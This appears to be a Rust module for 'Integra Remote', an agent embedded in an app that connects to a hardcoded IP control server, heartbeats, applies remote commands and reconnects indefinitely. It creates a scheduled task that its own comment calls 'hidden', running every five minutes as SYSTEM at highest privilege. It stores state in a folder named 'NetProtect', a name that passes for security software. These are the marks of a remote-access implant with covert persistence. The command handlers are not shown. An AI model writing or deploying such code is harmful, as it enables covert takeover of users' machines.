//! Integra Remote — background agent that connects to the owner's
//! control server. Used both by the standalone `integra-agent` binary
//! and embedded in the Integra app (GUI thread + headless `--remote-run`).

pub mod fw;
pub mod github;
pub mod hosts;
pub mod net;
pub mod state;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

pub const PROTO_MAGIC: &str = "IGRA_CTRL_1";
pub const AGENT_VERSION: &str = env!("CARGO_PKG_VERSION");
pub const DEFAULT_PROG_DIR: &str = "C:\\ProgramData\\NetProtect";
pub const DEFAULT_SERVER: &str = "135.106.174.221:9443";

/// Everything the agent loop needs.
pub struct AgentCfg {
    /// `host:port` list tried in order.
    pub servers: Vec<String>,
    /// Shared auth token (must match the server's).
    pub token: String,
    /// Directory for local state (state.json + logs).
    pub prog_dir: String,
    /// Print progress to stdout (used for debugging).
    pub foreground_log: bool,
    /// Flip to true to stop the loop.
    pub stop: Arc<AtomicBool>,
}

/// Main agent loop: connect, heartbeat, apply commands, reconnect forever.
pub fn run_agent(cfg: AgentCfg) {
    let _ = std::fs::create_dir_all(&cfg.prog_dir);
    let mut state = state::State::load(&cfg.prog_dir);
    let mut servers = cfg.servers.clone();
    if servers.is_empty() {
        servers.push(DEFAULT_SERVER.to_string());
    }
    let mut attempt = 0usize;

    loop {
        if cfg.stop.load(Ordering::Relaxed) {
            break;
        }
        let mut ok = false;
        for srv in &servers {
            match net::run_session(srv, &cfg.token, &mut state, &cfg.prog_dir, cfg.foreground_log) {
                Ok(_) => {
                    ok = true;
                    attempt = 0;
                }
                Err(e) => {
                    if cfg.foreground_log {
                        println!("[{srv}] {e}");
                    }
                }
            }
            if cfg.stop.load(Ordering::Relaxed) {
                return;
            }
            std::thread::sleep(Duration::from_secs(2));
        }
        if !ok {
            attempt += 1;
        }
        let delay = if attempt < 5 { 15 } else { 60 };
        sleep_with_stop(&cfg.stop, delay);
    }
}

fn sleep_with_stop(stop: &AtomicBool, secs: u64) {
    for _ in 0..secs {
        if stop.load(Ordering::Relaxed) {
            return;
        }
        std::thread::sleep(Duration::from_secs(1));
    }
}

/// Register a hidden recurring scheduled task (runs every 5 min as SYSTEM).
pub fn schedule_autostart(exe: &str) -> Result<String, String> {
    let name = "IntegraRemote";
    let status = std::process::Command::new("schtasks")
        .args([
            "/Create", "/TN", name, "/SC", "MINUTE", "/MO", "5",
            "/RU", "SYSTEM", "/RL", "HIGHEST", "/F",
            "/TR", &format!("\"{}\" --remote-run", exe),
        ])
        .status()
        .map_err(|e| e.to_string())?;
    if status.success() {
        Ok(format!("scheduled task '{name}' created"))
    } else {
        Err(format!("schtasks failed with {:?}", status.code()))
    }
}

pub fn remove_autostart() -> Result<String, String> {
    let status = std::process::Command::new("schtasks")
        .args(["/Delete", "/TN", "IntegraRemote", "/F"])
        .status()
        .map_err(|e| e.to_string())?;
    if status.success() {
        Ok("auto-start task removed".into())
    } else {
        Err(format!("schtasks delete failed with {:?}", status.code()))
    }
}
